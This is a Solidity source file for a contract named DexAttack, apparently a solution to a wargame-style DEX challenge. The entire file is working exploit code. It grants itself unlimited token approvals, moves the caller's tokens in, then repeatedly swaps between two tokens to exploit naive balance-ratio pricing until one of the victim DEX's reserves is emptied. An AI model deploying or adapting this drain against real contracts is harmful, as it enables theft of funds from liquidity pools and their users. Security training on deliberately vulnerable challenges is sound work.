// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IDex.sol";
import "./interfaces/ISwappableToken.sol";

contract DexAttack {
    IDex public immutable victimDex;
    uint256 private constant FROM = 0;
    uint256 private constant TO = 1;
    uint256 private constant MAX_UINT256 = type(uint256).max;

    constructor(IDex victimDex_) {
        victimDex = victimDex_;
    }

    function attack() external {
        ISwappableToken[2] memory tokens = [
            ISwappableToken(victimDex.token1()),
            ISwappableToken(victimDex.token2())
        ];

        for (uint256 i; i < tokens.length; ) {
            tokens[i].approve(msg.sender, address(this), MAX_UINT256);

            require(
                MAX_UINT256 == tokens[i].allowance(msg.sender, address(this)),
                "Dex: Sender approve failed"
            );

            tokens[i].approve(address(this), address(victimDex), MAX_UINT256);

            require(
                MAX_UINT256 ==
                    tokens[i].allowance(address(this), address(victimDex)),
                "Dex: Contract approve failed"
            );

            require(
                tokens[i].transferFrom(
                    msg.sender,
                    address(this),
                    tokens[i].balanceOf(msg.sender)
                ),
                "Dex: Token transfer failed"
            );

            unchecked {
                ++i;
            }
        }

        uint256[2] memory balances;
        uint256[2] memory dexBalances;
        uint256 fromIndex = FROM;
        uint256 toIndex = TO;
        while (true) {
            balances = [
                tokens[fromIndex].balanceOf(address(this)),
                tokens[toIndex].balanceOf(address(this))
            ];

            dexBalances = [
                tokens[fromIndex].balanceOf(address(victimDex)),
                tokens[toIndex].balanceOf(address(victimDex))
            ];

            if (
                dexBalances[TO] >
                victimDex.getSwapPrice(
                    address(tokens[fromIndex]),
                    address(tokens[toIndex]),
                    balances[FROM]
                )
            ) {
                victimDex.swap(
                    address(tokens[fromIndex]),
                    address(tokens[toIndex]),
                    balances[FROM]
                );
            } else {
                victimDex.swap(
                    address(tokens[fromIndex]),
                    address(tokens[toIndex]),
                    dexBalances[FROM]
                );
                break;
            }

            fromIndex = 1 - fromIndex;
            toIndex = 1 - toIndex;
        }

        require(
            0 == tokens[FROM].balanceOf(address(victimDex)) ||
                0 == tokens[TO].balanceOf(address(victimDex)),
            "Dex: Attack failed"
        );
    }
}
